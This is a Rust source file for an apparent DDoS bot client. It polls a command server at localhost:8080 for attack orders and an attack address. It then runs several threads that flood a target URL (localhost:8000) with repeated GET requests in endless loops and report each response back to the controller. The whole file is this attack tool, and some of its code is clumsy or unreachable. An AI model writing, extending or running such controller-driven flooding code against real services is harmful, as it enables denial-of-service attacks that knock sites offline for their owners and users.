use serde_json;
use std::sync::{Arc, Mutex, Condvar};

struct Client {
    host_address: String,
    address: String,
    attacking: bool,
    workers: Vec<Arc<(Mutex<Worker>, Condvar)>>,
    worker_threads: Vec<std::thread::JoinHandle<()>>,
}

struct Worker {
    host_address: String,
    attacking: bool,
    address: String,
    client: reqwest::blocking::Client,
}

impl Worker {
    fn new(addr: String, host: String) -> Worker {
        let client = reqwest::blocking::Client::new();
        let mut add = host.clone();
        add.push_str("/attack_info");
        Worker {host_address: add, attacking: true, address: addr, client }
    }
    fn start_requesting(&self) -> i32{
        if self.attacking {
            let to_attack = self.address.as_str();
            let res = self.client.get(to_attack).send().unwrap();
            let code = res.status().as_u16();
            let body = res.text().unwrap();
            let response_body = serde_json::json!({"code": code, "body":body});
            // println!("{}", response_body);
            self.client.post(self.host_address.as_str()).json(&response_body).send().unwrap();
            return 0;
        }
    1
    }
}

impl Client {
    fn new(host: String, addr: String) -> Client {
        let mut cl = Client { host_address: host, address: addr, attacking: true, workers: vec![], worker_threads: vec![] };
        // let thread_count = std::thread::available_parallelism().unwrap().get();
        let thread_count = 4;
        cl.worker_threads.reserve(thread_count);
        for _ in 0..thread_count {
            cl.workers.push(Arc::new((
                Mutex::new(Worker::new(cl.address.clone(), cl.host_address.clone())),
                    Condvar::new()
            )));

        }
        cl.host_address.push_str("/api/attack");
        return cl;
    }

    fn can_attack(&mut self) {
        let url = self.host_address.as_str();
        let req = reqwest::blocking::get(url).unwrap().text().unwrap();

        let attack_address_url = format!("{}/api/attack_address", self.host_address);
        let attack_address_resp = reqwest::blocking::get(&attack_address_url);
        let mut can_attack = false;
        if let Ok(resp) = attack_address_resp {
            if resp.status() == reqwest::StatusCode::OK {
                let body = resp.text().unwrap();
                if !body.is_empty() {
                    println!("Attack address found: {}", body);
                    can_attack = true;
                }
            }
        }

        if can_attack {
            println!("can attack");
            self.attacking = true;
            for el in self.workers.iter_mut() {
                println!("main thread command: huh?");
                let clone_el = el.clone();
                let (elem, cv) = &*clone_el;
                let mut worker = elem.lock().unwrap();
                worker.attacking = true;
                cv.notify_one();
            }
        } else {
            println!("can't attack");
            self.attacking = false;
            for el in self.workers.iter_mut() {
                let clone_el = el.clone();
                println!("main thread command: is to stop");
                let (elem, cv) = &*clone_el;
                let mut worker = elem.lock().unwrap();
                worker.attacking = false;
            }
        }
    }

    fn thread_worker(worker: Arc<(Mutex<Worker>, Condvar)>){
        let el = worker.clone();
        let (elem, cv) = &*el;
        loop {
            let mut w = elem.lock().unwrap();
            if !w.attacking {
                w = cv.wait_while(w, |w| !w.attacking).unwrap();
            }
            else {
                cv.notify_one();
            }
            let mut _r = 0;
            for _ in 0..5 {
                _r = w.start_requesting();
            }
        }
    }

    fn run(mut self) {
        let max_size = self.workers.capacity();
        let mut i = 0;
        while i < max_size {
            let ind = i.to_owned().clone();
            let worker = self.workers[ind].clone();
            self.worker_threads.push(std::thread::spawn(move || {
                Client::thread_worker(worker);
            }));
            println!("worker thread {}", ind);
            i += 1;
        }
        println!("main thread finished creating");
        self.can_attack();
        loop {
            println!("hello from main thread infinite loop");
            let mut j = 0;
            while j < 5 {
                if self.attacking {
                    let _ = reqwest::blocking::get(self.address.to_owned().as_str());
                }
                j += 1;
            }
            self.can_attack();
        }
        while self.worker_threads.len()>0 {
            let thread= self.worker_threads.pop().unwrap();
            thread.join().unwrap();
        }
    }
}


fn main() {
    let cl = Client::new(String::from("http://localhost:8080"),
                         String::from("http://localhost:8000"));
    cl.run();
}
